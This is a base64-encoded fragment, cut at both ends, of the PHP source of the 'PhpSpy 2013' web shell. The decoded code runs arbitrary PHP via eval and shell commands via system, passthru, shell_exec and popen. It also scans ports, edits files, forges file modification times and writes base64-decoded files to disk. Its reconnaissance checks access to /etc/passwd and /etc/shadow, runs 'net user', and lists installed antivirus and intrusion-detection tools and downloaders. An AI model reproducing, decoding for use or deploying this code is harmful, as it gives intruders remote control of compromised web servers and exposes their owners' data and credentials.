MikpOwoJcCgnUG9ydDonKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidwMycsJ3NpemUnPT44MCwndmFsdWUnPT4kcDMpKTsKCW1ha2VpbnB1dChhcnJheSgndmFsdWUnPT4nU2NhbicsJ3R5cGUnPT4nc3VibWl0JywnY2xhc3MnPT4nYnQnKSk7CglwKCc8L3A+Jyk7Cglmb3JtZm9vdCgpOwoKCWlmICgkcDEgPT0gJ3N0YXJ0JykgewoJCXAoJzxoMj5SZXN1bHQgJnJhcXVvOzwvaDI+Jyk7CgkJcCgnPHVsIGNsYXNzPSJpbmZvIj4nKTsKCQlmb3JlYWNoKGV4cGxvZGUoJywnLCAkcDMpIGFzICRwb3J0KSB7CgkJCSRmcCA9IEBmc29ja29wZW4oJHAyLCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAxKTsKCQkJaWYgKCEkZnApIHsKCQkJCXAoJzxsaT4nLiRwMi4nOicuJHBvcnQuJyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gPHNwYW4gY2xhc3M9ImIiPkNsb3NlPC9zcGFuPjwvbGk+Jyk7CgkJICAgfSBlbHNlIHsKCQkJCXAoJzxsaT4nLiRwMi4nOicuJHBvcnQuJyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gPHNwYW4gY2xhc3M9InJlZCBiIj5PcGVuPC9zcGFuPjwvbGk+Jyk7CgkJCQlAZmNsb3NlKCRmcCk7CgkJICAgfQoJCX0KCQlwKCc8L3VsPicpOwoJfQp9CgplbHNlaWYgKCRhY3QgPT0gJ2V2YWwnKSB7CgkkcGhwY29kZSA9IHRyaW0oJHAxKTsKCWlmKCRwaHBjb2RlKXsKCQlpZiAoIXByZWdfbWF0Y2goJyM8XD8jc2knLCAkcGhwY29kZSkpIHsKCQkJJHBocGNvZGUgPSAiPD9waHBcblxueyRwaHBjb2RlfVxuXG4/PiI7CgkJfQoJCWV2YWwoIj8iLiI+JHBocGNvZGU8PyIpOwoJfQoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J0V2YWwgUEhQIENvZGUnLCAnb25zdWJtaXQnPT4nZyhcJ2V2YWxcJyxudWxsLHRoaXMucDEudmFsdWUpO3JldHVybiBmYWxzZTsnKSk7CgltYWtldGV4dChhcnJheSgndGl0bGUnPT4nUEhQIENvZGUnLCduYW1lJz0+J3AxJywgJ3ZhbHVlJz0+JHBocGNvZGUpKTsKCXAoJzxwPjxhIGhyZWY9Imh0dHA6Ly93Jy4nd3cuNCcuJ25nJy4nZWwubmV0L3BocCcuJ3NwJy4neS9wbCcuJ3VnaW4vIiB0YXJnZXQ9Il9ibGFuayI+R2V0IHBsdWdpbnM8L2E+PC9wPicpOwoJZm9ybWZvb3RlcigpOwp9Ly9lbmQgZXZhbAoKZWxzZWlmICgkYWN0ID09ICdlZGl0ZmlsZScpIHsKCgkvLyDnvJbovpHmlofku7YKCWlmICgkcDEgPT0gJ2VkaXQnICYmICRwMiAmJiAkcDMpIHsKCQkkZnAgPSBAZm9wZW4oJHAyLCd3Jyk7CgkJbSgnU2F2ZSBmaWxlICcuKEBmd3JpdGUoJGZwLCRwMykgPyAnc3VjY2VzcycgOiAnZmFpbGVkJykpOwoJCUBmY2xvc2UoJGZwKTsKCX0KCSRjb250ZW50cyA9ICcnOwoJaWYoZmlsZV9leGlzdHMoJHAyKSkgewoJCSRmcD1AZm9wZW4oJHAyLCdyJyk7CgkJJGNvbnRlbnRzPUBmcmVhZCgkZnAsIGZpbGVzaXplKCRwMikpOwoJCUBmY2xvc2UoJGZwKTsKCQkkY29udGVudHM9aHRtbHNwZWNpYWxjaGFycygkY29udGVudHMpOwoJfQoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J0NyZWF0ZSAvIEVkaXQgRmlsZScsICdvbnN1Ym1pdCc9PidnKFwnZWRpdGZpbGVcJyxudWxsLFwnZWRpdFwnLHRoaXMucDIudmFsdWUsdGhpcy5wMy52YWx1ZSk7cmV0dXJuIGZhbHNlOycpKTsKCW1ha2VpbnB1dChhcnJheSgndGl0bGUnPT4nRmlsZW5hbWUnLCduYW1lJz0+J3AyJywndmFsdWUnPT4kcDIsJ25ld2xpbmUnPT4xKSk7CgltYWtldGV4dChhcnJheSgndGl0bGUnPT4nRmlsZSBDb250ZW50JywnbmFtZSc9PidwMycsJ3ZhbHVlJz0+JGNvbnRlbnRzKSk7Cglmb3JtZm9vdGVyKCk7Cglnb2JhY2soKTsKCn0vL2VuZCBlZGl0ZmlsZQoKZWxzZWlmICgkYWN0ID09ICduZXd0aW1lJykgewoJJGZpbGVtdGltZSA9IEBmaWxlbXRpbWUoJHAxKTsKCglmb3JtaGVhZChhcnJheSgndGl0bGUnPT4nQ2xvbmUgZm9sZGVyL2ZpbGUgd2FzIGxhc3QgbW9kaWZpZWQgdGltZScsICdvbnN1Ym1pdCc9PidnKFwnZmlsZVwnLG51bGwsXCdjbG9uZXRpbWVcJyx0aGlzLnAyLnZhbHVlLHRoaXMucDMudmFsdWUpO3JldHVybiBmYWxzZTsnKSk7CgltYWtlaW5wdXQoYXJyYXkoJ3RpdGxlJz0+J0FsdGVyIGZvbGRlci9maWxlJywnbmFtZSc9PidwMicsJ3ZhbHVlJz0+JHAxLCdzaXplJz0+MTIwLCduZXdsaW5lJz0+MSkpOwoJbWFrZWlucHV0KGFycmF5KCd0aXRsZSc9PidSZWZlcmVuY2UgZm9sZGVyL2ZpbGUnLCduYW1lJz0+J3AzJywndmFsdWUnPT4kY3dkLCdzaXplJz0+MTIwLCduZXdsaW5lJz0+MSkpOwoJZm9ybWZvb3RlcigpOwoKCWZvcm1oZWFkKGFycmF5KCd0aXRsZSc9PidTZXQgbGFzdCBtb2RpZmllZCcsICdvbnN1Ym1pdCc9PidnKFwnZmlsZVwnLG51bGwsXCdzZXR0aW1lXCcsdGhpcy5wMi52YWx1ZSx0aGlzLnAzLnZhbHVlKTtyZXR1cm4gZmFsc2U7JykpOwoJbWFrZWlucHV0KGFycmF5KCd0aXRsZSc9PidDdXJyZW50IGZvbGRlci9maWxlJywnbmFtZSc9PidwMicsJ3ZhbHVlJz0+JHAxLCdzaXplJz0+MTIwLCduZXdsaW5lJz0+MSkpOwoJbWFrZWlucHV0KGFycmF5KCd0aXRsZSc9PidNb2RpZnkgdGltZScsJ25hbWUnPT4ncDMnLCd2YWx1ZSc9PmRhdGUoIlktbS1kIEg6aTpzIiwgJGZpbGVtdGltZSksJ3NpemUnPT4xMjAsJ25ld2xpbmUnPT4xKSk7Cglmb3JtZm9vdGVyKCk7CgoJZ29iYWNrKCk7Cn0vL2VuZCBuZXd0aW1lCgplbHNlaWYgKCRhY3QgPT0gJ3NoZWxsJykgewoJZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J0V4ZWN1dGUgQ29tbWFuZCcsICdvbnN1Ym1pdCc9PidnKFwnc2hlbGxcJyxudWxsLHRoaXMucDEudmFsdWUpO3JldHVybiBmYWxzZTsnKSk7CglwKCc8cD4nKTsKCW1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidwMScsJ3ZhbHVlJz0+aHRtbHNwZWNpYWxjaGFycygkcDEpKSk7CgltYWtlaW5wdXQoYXJyYXkoJ2NsYXNzJz0+J2J0JywndHlwZSc9PidzdWJtaXQnLCd2YWx1ZSc9PidFeGVjdXRlJykpOwoJcCgnPC9wPicpOwoJZm9ybWZvb3QoKTsKCglpZiAoJHAxKSB7CgkJcCgnPHByZT4nLmV4ZWN1dGUoJHAxKS4nPC9wcmU+Jyk7Cgl9Cn0vL2VuZCBzaGVsbAoKZWxzZWlmICgkYWN0ID09ICdwaHBlbnYnKSB7CgkkZD1hcnJheSgpOwoJaWYoZnVuY3Rpb25fZXhpc3RzKCdteXNxbF9nZXRfY2xpZW50X2luZm8nKSkKCQkkZFtdID0gIk15U3FsICgiLm15c3FsX2dldF9jbGllbnRfaW5mbygpLiIpIjsKCWlmKGZ1bmN0aW9uX2V4aXN0cygnbXNzcWxfY29ubmVjdCcpKQoJCSRkW10gPSAiTVNTUUwiOwoJaWYoZnVuY3Rpb25fZXhpc3RzKCdwZ19jb25uZWN0JykpCgkJJGRbXSA9ICJQb3N0Z3JlU1FMIjsKCWlmKGZ1bmN0aW9uX2V4aXN0cygnb2NpX2Nvbm5lY3QnKSkKCQkkZFtdID0gIk9yYWNsZSI7CgkkaW5mbyA9IGFycmF5KAoJCTEgPT4gYXJyYXkoJ1NlcnZlciBUaW1lJyxkYXRlKCdZL20vZCBoOmk6cycsJHRpbWVzdGFtcCkpLAoJCTIgPT4gYXJyYXkoJ1NlcnZlciBEb21haW4nLCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKSwKCQkzID0+IGFycmF5KCdTZXJ2ZXIgSVAnLGdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pKSwKCQk0ID0+IGFycmF5KCdTZXJ2ZXIgT1MnLFBIUF9PUyksCgkJNSA9PiBhcnJheSgnU2VydmVyIE9TIENoYXJzZXQnLCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKSwKCQk2ID0+IGFycmF5KCdTZXJ2ZXIgU29mdHdhcmUnLCRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXSksCgkJNyA9PiBhcnJheSgnU2VydmVyIFdlYiBQb3J0JywkX1NFUlZFUlsnU0VSVkVSX1BPUlQnXSksCgkJOCA9PiBhcnJheSgnUEhQIHJ1biBtb2RlJyxzdHJ0b3VwcGVyKHBocF9zYXBpX25hbWUoKSkpLAoJCTkgPT4gYXJyYXkoJ1RoZSBmaWxlIHBhdGgnLF9fRklMRV9fKSwKCgkJMTAgPT4gYXJyYXkoJ1BIUCBWZXJzaW9uJyxQSFBfVkVSU0lPTiksCgkJMTEgPT4gYXJyYXkoJ1BIUElORk8nLChJU19QSFBJTkZPID8gJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ3BocGluZm9cJyk7Ij5ZZXM8L2E+JyA6ICdObycpKSwKCQkxMiA9PiBhcnJheSgnU2FmZSBNb2RlJyxnZXRjZmcoJ3NhZmVfbW9kZScpKSwKCQkxMyA9PiBhcnJheSgnQWRtaW5pc3RyYXRvcicsKGlzc2V0KCRfU0VSVkVSWydTRVJWRVJfQURNSU4nXSkgPyAkX1NFUlZFUlsnU0VSVkVSX0FETUlOJ10gOiBnZXRjZmcoJ3NlbmRtYWlsX2Zyb20nKSkpLAoJCTE0ID0+IGFycmF5KCdhbGxvd191cmxfZm9wZW4nLGdldGNmZygnYWxsb3dfdXJsX2ZvcGVuJykpLAoJCTE1ID0+IGFycmF5KCdlbmFibGVfZGwnLGdldGNmZygnZW5hYmxlX2RsJykpLAoJCTE2ID0+IGFycmF5KCdkaXNwbGF5X2Vycm9ycycsZ2V0Y2ZnKCdkaXNwbGF5X2Vycm9ycycpKSwKCQkxNyA9PiBhcnJheSgncmVnaXN0ZXJfZ2xvYmFscycsZ2V0Y2ZnKCdyZWdpc3Rlcl9nbG9iYWxzJykpLAoJCTE4ID0+IGFycmF5KCdtYWdpY19xdW90ZXNfZ3BjJyxnZXRjZmcoJ21hZ2ljX3F1b3Rlc19ncGMnKSksCgkJMTkgPT4gYXJyYXkoJ21lbW9yeV9saW1pdCcsZ2V0Y2ZnKCdtZW1vcnlfbGltaXQnKSksCgkJMjAgPT4gYXJyYXkoJ3Bvc3RfbWF4X3NpemUnLGdldGNmZygncG9zdF9tYXhfc2l6ZScpKSwKCQkyMSA9PiBhcnJheSgndXBsb2FkX21heF9maWxlc2l6ZScsKGdldGNmZygnZmlsZV91cGxvYWRzJykgPyBnZXRjZmcoJ3VwbG9hZF9tYXhfZmlsZXNpemUnKSA6ICdOb3QgYWxsb3dlZCcpKSwKCQkyMiA9PiBhcnJheSgnbWF4X2V4ZWN1dGlvbl90aW1lJyxnZXRjZmcoJ21heF9leGVjdXRpb25fdGltZScpLicgc2Vjb25kKHMpJyksCgkJMjMgPT4gYXJyYXkoJ2Rpc2FibGVfZnVuY3Rpb25zJywoJGRpc19mdW5jID8gJGRpc19mdW5jIDogJ05vJykpLAoJCTI0ID0+IGFycmF5KCdTdXBwb3J0ZWQgZGF0YWJhc2VzJyxpbXBsb2RlKCcsICcsICRkKSksCgkJMjUgPT4gYXJyYXkoJ2NVUkwgc3VwcG9ydCcsZnVuY3Rpb25fZXhpc3RzKCdjdXJsX3ZlcnNpb24nKSA/ICdZZXMnIDogJ05vJyksCgkJMjYgPT4gYXJyYXkoJ09wZW4gYmFzZSBkaXInLGdldGNmZygnb3Blbl9iYXNlZGlyJykpLAoJCTI3ID0+IGFycmF5KCdTYWZlIG1vZGUgZXhlYyBkaXInLGdldGNmZygnc2FmZV9tb2RlX2V4ZWNfZGlyJykpLAoJCTI4ID0+IGFycmF5KCdTYWZlIG1vZGUgaW5jbHVkZSBkaXInLGdldGNmZygnc2FmZV9tb2RlX2luY2x1ZGVfZGlyJykpLAoJKTsKCgkkaHAgPSBhcnJheSgwPT4gJ1NlcnZlcicsIDE9PiAnUEhQJyk7Cglmb3IoJGE9MDskYTwyOyRhKyspIHsKCQlwKCc8aDI+Jy4kaHBbJGFdLicgJnJhcXVvOzwvaDI+Jyk7CgkJcCgnPHVsIGNsYXNzPSJpbmZvIj4nKTsKCQlpZiAoJGE9PTApIHsKCQkJZm9yKCRpPTE7JGk8PTk7JGkrKykgewoJCQkJcCgnPGxpPjx1PicuJGluZm9bJGldWzBdLic6PC91PicuJGluZm9bJGldWzFdLic8L2xpPicpOwoJCQl9CgkJfSBlbHNlaWYgKCRhID09IDEpIHsKCQkJZm9yKCRpPTEwOyRpPD0yNTskaSsrKSB7CgkJCQlwKCc8bGk+PHU+Jy4kaW5mb1skaV1bMF0uJzo8L3U+Jy4kaW5mb1skaV1bMV0uJzwvbGk+Jyk7CgkJCX0KCQl9CgkJcCgnPC91bD4nKTsKCX0KfS8vZW5kIHBocGVudgoKZWxzZWlmICgkYWN0ID09ICdzZWNpbmZvJykgewoKCWlmKCAhSVNfV0lOICkgewoJCSR1c2VyZnVsID0gYXJyYXkoJ2djYycsJ2xjYycsJ2NjJywnbGQnLCdtYWtlJywncGhwJywncGVybCcsJ3B5dGhvbicsJ3J1YnknLCd0YXInLCdnemlwJywnYnppcCcsJ2J6aXAyJywnbmMnLCdsb2NhdGUnLCdzdWlkcGVybCcpOwoJCSRkYW5nZXIgPSBhcnJheSgna2F2Jywnbm9kMzInLCdiZGNvcmVkJywndXZzY2FuJywnc2F2JywnZHJ3ZWJkJywnY2xhbWQnLCdya2h1bnRlcicsJ2Noa3Jvb3RraXQnLCdpcHRhYmxlcycsJ2lwZncnLCd0cmlwd2lyZScsJ3NoaWVsZGNjJywncG9ydHNlbnRyeScsJ3Nub3J0Jywnb3NzZWMnLCdsaWRzYWRtJywndGNwbG9kZycsJ3N4aWQnLCdsb2djaGVjaycsJ2xvZ3dhdGNoJywnc3lzbWFzaycsJ3ptYnNjYXAnLCdzYXdtaWxsJywnd29ybXNjYW4nLCduaW5qYScpOwoJCSRkb3dubG9hZGVycyA9IGFycmF5KCd3Z2V0JywnZmV0Y2gnLCdseW54JywnbGlua3MnLCdjdXJsJywnZ2V0JywnbHdwLW1pcnJvcicpOwoJCXNlY3BhcmFtKCdSZWFkYWJsZSAvZXRjL3Bhc3N3ZCcsIEBpc19yZWFkYWJsZSgnL2V0Yy9wYXNzd2QnKSA/ICJ5ZXMiIDogJ25vJyk7CgkJc2VjcGFyYW0oJ1JlYWRhYmxlIC9ldGMvc2hhZG93JywgQGlzX3JlYWRhYmxlKCcvZXRjL3NoYWRvdycpID8gInllcyIgOiAnbm8nKTsKCQlzZWNwYXJhbSgnT1MgdmVyc2lvbicsIEBmaWxlX2dldF9jb250ZW50cygnL3Byb2MvdmVyc2lvbicpKTsKCQlzZWNwYXJhbSgnRGlzdHIgbmFtZScsIEBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9pc3N1ZS5uZXQnKSk7CgkJJHNhZmVfbW9kZSA9IEBpbmlfZ2V0KCdzYWZlX21vZGUnKTsKCQlpZighJEdMT0JBTFNbJ3NhZmVfbW9kZSddKSB7CgkJCSR0ZW1wPWFycmF5KCk7CgkJCWZvcmVhY2ggKCR1c2VyZnVsIGFzICRpdGVtKQoJCQkJaWYod2hpY2goJGl0ZW0pKXskdGVtcFtdPSRpdGVtO30KCQkJc2VjcGFyYW0oJ1VzZXJmdWwnLCBpbXBsb2RlKCcsICcsJHRlbXApKTsKCQkJJHRlbXA9YXJyYXkoKTsKCQkJZm9yZWFjaCAoJGRhbmdlciBhcyAkaXRlbSkKCQkJCWlmKHdoaWNoKCRpdGVtKSl7JHRlbXBbXT0kaXRlbTt9CgkJCXNlY3BhcmFtKCdEYW5nZXInLCBpbXBsb2RlKCcsICcsJHRlbXApKTsKCQkJJHRlbXA9YXJyYXkoKTsKCQkJZm9yZWFjaCAoJGRvd25sb2FkZXJzIGFzICRpdGVtKQoJCQkJaWYod2hpY2goJGl0ZW0pKXskdGVtcFtdPSRpdGVtO30KCQkJc2VjcGFyYW0oJ0Rvd25sb2FkZXJzJywgaW1wbG9kZSgnLCAnLCR0ZW1wKSk7CgkJCXNlY3BhcmFtKCdIb3N0cycsIEBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9ob3N0cycpKTsKCQkJc2VjcGFyYW0oJ0hERCBzcGFjZScsIGV4ZWN1dGUoJ2RmIC1oJykpOwoJCQlzZWNwYXJhbSgnTW91bnQgb3B0aW9ucycsIEBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9mc3RhYicpKTsKCQl9Cgl9IGVsc2UgewoJCXNlY3BhcmFtKCdPUyBWZXJzaW9uJyxleGVjdXRlKCd2ZXInKSk7CgkJc2VjcGFyYW0oJ0FjY291bnQgU2V0dGluZ3MnLGV4ZWN1dGUoJ25ldCBhY2NvdW50cycpKTsKCQlzZWNwYXJhbSgnVXNlciBBY2NvdW50cycsZXhlY3V0ZSgnbmV0IHVzZXInKSk7CgkJc2VjcGFyYW0oJ0lQIENvbmZpZ3VyYXRlJyxleGVjdXRlKCdpcGNvbmZpZyAtYWxsJykpOwoJfQp9Ly9lbmQKCmVsc2UgewoJbSgnVW5kZWZpbmVkIEFjdGlvbicpOwp9Cgo/Pgo8L3RkPjwvdHI+PC90YWJsZT4KPGRpdiBzdHlsZT0icGFkZGluZzoxMHB4O2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNmZmY7Ym9yZGVyLXRvcDoxcHggc29saWQgI2RkZDtiYWNrZ3JvdW5kOiNlZWU7Ij4KCTxzcGFuIHN0eWxlPSJmbG9hdDpyaWdodDsiPgoJPD9waHAKCWRlYnVnaW5mbygpOwoJb2JfZW5kX2ZsdXNoKCk7CglpZiAoaXNzZXQoJERCKSkgewoJCWVjaG8gJy4gJy4kREItPnF1ZXJ5Y291bnQuJyBxdWVyaWVzJzsKCX0KCT8+Cgk8L3NwYW4+CglQb3dlcmVkIGJ5IDxhIHRpdGxlPSJCdWlsZCAyMDEzMDExMiIgaHJlZj0iaHR0cDovL3d3dy40bmdlbC5uZXQiIHRhcmdldD0iX2JsYW5rIj48P3BocCBlY2hvIHN0cl9yZXBsYWNlKCcuJywnJywnUC5oLnAuUy5wLnknKTs/PiAyMDEzIGZpbmFsPC9hPi4gQ29weXJpZ2h0IChDKSAyMDA0LTIwMTMgPGEgaHJlZj0iaHR0cDovL3d3dy40bmdlbC5uZXQiIHRhcmdldD0iX2JsYW5rIj5bUzRUXTwvYT4gQWxsIFJpZ2h0cyBSZXNlcnZlZC4KPC9kaXY+CjwvYm9keT4KPC9odG1sPgoKPD9waHAKCi8qPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CuWHveaVsOW6kwo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0qLwoKZnVuY3Rpb24gc2VjcGFyYW0oJG4sICR2KSB7CgkkdiA9IHRyaW0oJHYpOwoJaWYoJHYpIHsKCQlwKCc8aDI+Jy4kbi4nICZyYXF1bzs8L2gyPicpOwoJCXAoJzxkaXYgY2xhc3M9ImluZm9saXN0Ij4nKTsKCQlpZihzdHJwb3MoJHYsICJcbiIpID09PSBmYWxzZSkKCQkJcCgkdi4nPGJyIC8+Jyk7CgkJZWxzZQoJCQlwKCc8cHJlPicuJHYuJzwvcHJlPicpOwoJCXAoJzwvZGl2PicpOwoJfQp9CmZ1bmN0aW9uIG0oJG1zZykgewoJZWNobyAnPGRpdiBzdHlsZT0ibWFyZ2luOjEwcHggYXV0byAxNXB4IGF1dG87YmFja2dyb3VuZDojZmZmZmUwO2JvcmRlcjoxcHggc29saWQgI2U2ZGI1NTtwYWRkaW5nOjEwcHg7Zm9udDoxNHB4O3RleHQtYWxpZ246Y2VudGVyO2ZvbnQtd2VpZ2h0OmJvbGQ7Ij4nOwoJZWNobyAkbXNnOwoJZWNobyAnPC9kaXY+JzsKfQpmdW5jdGlvbiBzX2FycmF5KCRhcnJheSkgewoJcmV0dXJuIGlzX2FycmF5KCRhcnJheSkgPyBhcnJheV9tYXAoJ3NfYXJyYXknLCAkYXJyYXkpIDogc3RyaXBzbGFzaGVzKCRhcnJheSk7Cn0KZnVuY3Rpb24gc2Nvb2tpZSgka2V5LCAkdmFsdWUsICRsaWZlID0gMCwgJHByZWZpeCA9IDEpIHsKCWdsb2JhbCAkdGltZXN0YW1wLCAkX1NFUlZFUiwgJGNvb2tpZXByZSwgJGNvb2tpZWRvbWFpbiwgJGNvb2tpZXBhdGgsICRjb29raWVsaWZlOwoJJGtleSA9ICgkcHJlZml4ID8gJGNvb2tpZXByZSA6ICcnKS4ka2V5OwoJJGxpZmUgPSAkbGlmZSA/ICRsaWZlIDogJGNvb2tpZWxpZmU7CgkkdXNlcG9ydCA9ICRfU0VSVkVSWydTRVJWRVJfUE9SVCddID09IDQ0MyA/IDEgOiAwOwoJc2V0Y29va2llKCRrZXksICR2YWx1ZSwgJHRpbWVzdGFtcCskbGlmZSwgJGNvb2tpZXBhdGgsICRjb29raWVkb21haW4sICR1c2Vwb3J0KTsKfQpmdW5jdGlvbiBsb2dpbnBhZ2UoKSB7Cglmb3JtaGVhZCgpOwoJbWFrZWhpZGUoJ2FjdCcsJ2xvZ2luJyk7CgltYWtlaW5wdXQoYXJyYXkoJ25hbWUnPT4ncGFzc3dvcmQnLCd0eXBlJz0+J3Bhc3N3b3JkJywnc2l6ZSc9PicyMCcpKTsKCW1ha2VpbnB1dChhcnJheSgndHlwZSc9PidzdWJtaXQnLCd2YWx1ZSc9PidMb2dpbicpKTsKCWZvcm1mb290KCk7CglleGl0Owp9CmZ1bmN0aW9uIGV4ZWN1dGUoJGNmZSkgewoJJHJlcyA9ICcnOwoJaWYgKCRjZmUpIHsKCQlpZihmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKSB7CgkJCUBvYl9zdGFydCgpOwoJCQlAc3lzdGVtKCRjZmUpOwoJCQkkcmVzID0gQG9iX2dldF9jb250ZW50cygpOwoJCQlAb2JfZW5kX2NsZWFuKCk7CgkJfSBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKSB7CgkJCUBvYl9zdGFydCgpOwoJCQlAcGFzc3RocnUoJGNmZSk7CgkJCSRyZXMgPSBAb2JfZ2V0X2NvbnRlbnRzKCk7CgkJCUBvYl9lbmRfY2xlYW4oKTsKCQl9IGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSkgewoJCQkkcmVzID0gQHNoZWxsX2V4ZWMoJGNmZSk7CgkJfSBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpIHsKCQkJQGV4ZWMoJGNmZSwkcmVzKTsKCQkJJHJlcyA9IGpvaW4oIlxuIiwkcmVzKTsKCQl9IGVsc2VpZihAaXNfcmVzb3VyY2UoJGYgPSBAcG9wZW4oJGNmZSwiciIpKSkgewoJCQkkcmVzID0gJyc7CgkJCXdoaWxlKCFAZmVvZigkZikpIHsKCQkJCSRyZXMgLj0gQGZyZWFkKCRmLDEwMjQpOwoJCQl9CgkJCUBwY2xvc2UoJGYpOwoJCX0KCX0KCXJldHVybiAkcmVzOwp9CmZ1bmN0aW9uIHdoaWNoKCRwcikgewoJJHBhdGggPSBleGVjdXRlKCJ3aGljaCAkcHIiKTsKCXJldHVybiAoJHBhdGggPyAkcGF0aCA6ICRwcik7Cn0KZnVuY3Rpb24gY2YoJGZuYW1lLCR0ZXh0KXsKCWlmKCRmcD1AZm9wZW4oJGZuYW1lLCd3JykpIHsKCQlAZnB1dHMoJGZwLEBiYXNlNjRfZGVjb2RlKCR0ZXh0KSk7CgkJQGZjbG9zZSgkZnApOwoJfQp9CmZ1bmN0aW9uIGRpcnNpemUoJGN3ZCkgewoJJGRoID0gQG9wZW5kaXIoJGN3ZCk7Cgkkc2l6ZSA9IDA7Cgl3aGlsZSgkZmlsZSA9IEByZWFkZGlyKCRkaCkpIHsKCQlpZiAoJGZpbGUgIT0gJy4nICYmICRmaWxlICE9ICcuLicpIHsKCQkJJHBhdGggPSAkY3dkLicvJy4kZmlsZTsKCQkJJHNpemUgKz0gQGlzX2RpcigkcGF0aCkgPyBkaXJzaXplKCRwYXRoKSA6IHNwcmludGYoIiV1IiwgQGZpbGVzaXplKCRwYXRoKSk7CgkJfQoJfQoJQGNsb3NlZGlyKCRkaCk7CglyZXR1cm4gJHNpemU7Cn0KLy8g6aG16Z2i6LCD6K+V5L+h5oGvCmZ1bmN0aW9uIGRlYnVnaW5mbygpIHsKCWdsb2JhbCAkc3RhcnR0aW1lOwoJJG10aW1lID0gZXhwbG9kZSgnICcsIG1pY3JvdGltZSgpKTsKCSR0b3RhbHRpbWUgPSBudW1iZXJfZm9ybWF0KCgkbXRpbWVbMV0gKyAkbXRpbWVbMF0gLSAkc3RhcnR0aW1lKSwgNik7CgllY2hvICdQcm9jZXNzZWQgaW4gJy4kdG90YWx0aW1lLicgc2Vjb25kKHMpJzsKfQoKLy8g5riF6ZmkSFRNTOS7o+eggQpmdW5jdGlvbiBodG1sX2NsZWFuKCRjb250ZW50KSB7CgkkY29udGVudCA9IGh0bWxzcGVjaWFsY2hhcnMoJGNvbnRlbnQpOwoJJGNvbnRlbnQgPSBzdHJfcmVwbGFjZSgiXG4iLCAiPGJyIC8+IiwgJGNvbnRlbnQpOwoJJGNvbnRlbnQgPSBzdHJfcmVwbGFjZSgiICAiLCAiJm5ic3A7Jm5ic3A7IiwgJGNvbnRlbnQpOwoJJGNvbnRlbnQgPSBzdHJfcmVwbGFjZSgiXHQiLCAiJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7IiwgJGNvbnRlbnQpOwoJcmV0dXJuICRjb250ZW50Owp9CgovLyDojrflj5bmnYPpmZAKZnVuY3Rpb24gZ2V0Q2htb2QoJGZpbGUpewoJcmV0dXJuIHN1YnN0cihiYXNlX2NvbnZlcnQoQGZpbGVwZXJtcygkZmlsZSksMTAsOCksLTQpOwp9CgpmdW5jdGlvbiBQZXJtc0NvbG9yKCRmKSB7CglpZiAoIWlzX3JlYWRhYmxlKCRmKSkgewoJCXJldHVybiAnPHNwYW4gY2xhc3M9InJlZCI+Jy5nZXRQZXJtcygkZikuJzwvc3Bhbj4nOwoJfSBlbHNlaWYgKCFpc193cml0YWJsZSgkZikpIHsKCQlyZXR1cm4gJzxzcGFuIGNsYXNzPSJibGFjayI+Jy5nZXRQZXJtcygkZikuJzwvc3Bhbj4nOwoJfSBlbHNlIHsKCQlyZXR1cm4gJzxzcGFuIGNsYXNzPSJncmVlbiI+Jy5nZXRQZXJtcygkZikuJzwvc3Bhbj4nOwoJfQp9CmZ1bmN0aW9uIGdldFBlcm1zKCRmaWxlKSB7CgkkbW9kZSA9IEBmaWxlcGVybXMoJGZpbGUpOwoJaWYgKCgkbW9kZSAmIDB4QzAwMCkgPT09IDB4QzAwMCkgeyR0eXBlID0gJ3MnO30KCWVsc2VpZiAoKCRtb2RlICYgMHg0MDAwKSA9PT0gMHg0MDAwKSB7JHR5cGUgPSAnZCc7fQoJZWxzZWlmICgoJG1vZGUgJiAweEEwMDApID09PSAweEEwMDApIHskdHlwZSA9ICdsJzt9CgllbHNlaWYgKCgkbW9kZSAmIDB4ODAwMCkgPT09IDB4ODAwMCkgeyR0eXBlID0gJy0nO30KCWVsc2VpZiAoKCRtb2RlICYgMHg2MDAwKSA9PT0gMHg2MDAwKSB7JHR5cGUgPSAnYic7fQoJZWxzZWlmICgoJG1vZGUgJiAweDIwMDApID09PSAweDIwMDApIHskdHlwZSA9ICdjJzt9CgllbHNlaWYgKCgkbW9kZSAmIDB4MTAwMCkgPT09IDB4MTAwMCkgeyR0eXBlID0gJ3AnO30KCWVsc2UgeyR0eXBlID0gJz8nO30KCgkkb3duZXJbJ3JlYWQnXSA9ICgkbW9kZSAmIDAwNDAwKSA/ICdyJyA6ICctJzsKCSRvd25lclsnd3JpdGUnXSA9ICgkbW9kZSAmIDAwMjAwKSA/ICd3JyA6ICctJzsKCSRvd25lclsnZXhlY3V0ZSddID0gKCRtb2RlICYgMDAxMDApID8gJ3gnIDogJy0nOwoJJGdyb3VwWydyZWFkJ10gPSAoJG1vZGUgJiAwMDA0MCkgPyAncicgOiAnLSc7CgkkZ3JvdXBbJ3dyaXRlJ10gPSAoJG1vZGUgJiAwMDAyMCkgPyAndycgOiAnLSc7CgkkZ3JvdXBbJ2V4ZWN1dGUnXSA9ICgkbW9kZSAmIDAwMDEwKSA/ICd4JyA6ICctJzsKCSR3b3JsZFsncmVhZCddID0gKC